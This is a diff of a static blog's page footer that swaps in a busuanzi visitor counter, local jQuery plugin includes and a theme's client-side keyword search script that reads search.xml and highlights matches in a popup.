+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+ 
+
+
+
+
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
     
 
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-<script src="/js/script.js"></script>
-
-
+    
 
   </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
 </body>
 </html>
